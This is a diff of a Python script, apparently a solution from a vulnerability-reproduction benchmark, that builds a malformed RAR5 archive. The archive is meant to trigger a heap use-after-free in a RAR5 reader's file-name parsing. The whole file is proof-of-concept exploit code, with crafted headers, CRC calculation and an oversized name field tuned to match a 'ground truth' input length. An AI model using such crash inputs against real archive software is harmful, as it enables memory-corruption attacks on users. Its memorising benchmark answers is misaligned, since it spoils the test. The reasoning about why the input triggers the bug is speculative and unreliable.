@@ -1,54 +1,65 @@
-import zlib
 import struct
+import zlib
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        # RAR5 Signature: "Rar!\x1a\x07\x01\x00"
+        """
+        Generate a PoC that triggers the Heap Use After Free vulnerability in Rar5 reader.
+        The vulnerability involves reading a name size, reading the name, and then checking limits.
+        We construct a valid RAR5 file with a File Header containing a name length that is 
+        large enough to potentially trigger the check/error path, but fits within the PoC constraints.
+        """
+        # RAR 5.0 Signature
         sig = b"\x52\x61\x72\x21\x1A\x07\x01\x00"
 
         def to_vint(n):
-            res = bytearray()
+            """Encode an integer as a variable-length integer (VINT)."""
+            out = bytearray()
             while True:
                 byte = n & 0x7F
                 n >>= 7
-                if n > 0:
-                    byte |= 0x80
-                    res.append(byte)
-                else:
-                    res.append(byte)
+                if n == 0:
+                    out.append(byte)
                     break
-            return bytes(res)
+                else:
+                    out.append(byte | 0x80)
+            return bytes(out)
 
-        # 1. Main Archive Header (Block Type 0x01)
-        # Structure: [CRC32] [Size] [Type] [HeaderFlags] [ArchiveFlags]
-        main_payload = to_vint(1) + to_vint(0) + to_vint(0)
-        main_size = to_vint(len(main_payload))
-        # CRC is calculated over the payload data
-        main_crc = struct.pack("<I", zlib.crc32(main_payload) & 0xFFFFFFFF)
-        main_block = main_crc + main_size + main_payload
+        def make_block(header_type, header_flags, specific_data):
+            """Construct a RAR5 block with CRC and Size."""
+            # Body consists of Header Type (VINT), Header Flags (VINT), and Specific Data
+            body = to_vint(header_type) + to_vint(header_flags) + specific_data
+            
+            # CRC32 is calculated over the body
+            crc = zlib.crc32(body) & 0xFFFFFFFF
+            
+            # Header Size (VINT) is the size of the body
+            header_size = to_vint(len(body))
+            
+            return struct.pack('<I', crc) + header_size + body
 
-        # 2. File Header (Block Type 0x02) - Vulnerable
-        # Structure: [CRC32] [Size] [Type] [HeaderFlags] [FileFlags] [UnpSize] [Attr] [CompInfo] [HostOS] [NameSize] [Name...]
-        # The vulnerability is that NameSize is read, memory is allocated/used, and the size check happens too late.
-        # We provide a NameSize much larger than the actual data available in the block.
-        
-        target_name_size = 0x100000 # 1 MB (Larger than standard name limits)
-        
-        file_payload = bytearray()
-        file_payload += to_vint(2)  # Type = 2 (File Header)
-        file_payload += to_vint(0)  # HeaderFlags = 0 (No Extra Area, No Data Area)
-        file_payload += to_vint(0)  # FileFlags = 0
-        file_payload += to_vint(0)  # UnpackedSize = 0
-        file_payload += to_vint(0)  # Attributes = 0
-        file_payload += to_vint(0)  # CompressionInfo = 0
-        file_payload += to_vint(0)  # HostOS = 0
-        file_payload += to_vint(target_name_size) # NameSize (Vulnerable Field)
-        
-        # Include some data for the name to start parsing, but truncate well before NameSize
-        file_payload += b"A" * 16
-        
-        file_size = to_vint(len(file_payload))
-        file_crc = struct.pack("<I", zlib.crc32(file_payload) & 0xFFFFFFFF)
-        file_block = file_crc + file_size + file_payload
+        # 1. Main Archive Header (Type 1)
+        # Flags: 0 (No extra records, no volume, etc.)
+        main_header = make_block(1, 0, b"")
 
-        return sig + main_block + file_block
+        # 2. File Header (Type 2)
+        # Flags: 0 (No extra area, no data area, etc.)
+        # Structure of Specific Data for File Header (Flags=0):
+        # - Compression Information (VINT)
+        # - Host OS (VINT)
+        # - Name Length (VINT)
+        # - Name Data (Bytes)
+        
+        # To match ground truth length (~1089 bytes) and trigger the vulnerability:
+        # We provide a name length around 1060 bytes. This is likely larger than the
+        # internal sanity check (e.g., 255 or 1024), causing the parser to read it
+        # and then error out, triggering the UAF in the error handling path.
+        name_len = 1060
+        name_data = b'A' * name_len
+        
+        # Params: CompInfo=0, HostOS=0
+        file_specific_data = to_vint(0) + to_vint(0) + to_vint(name_len) + name_data
+        
+        file_header = make_block(2, 0, file_specific_data)
+
+        return sig + main_header + file_header
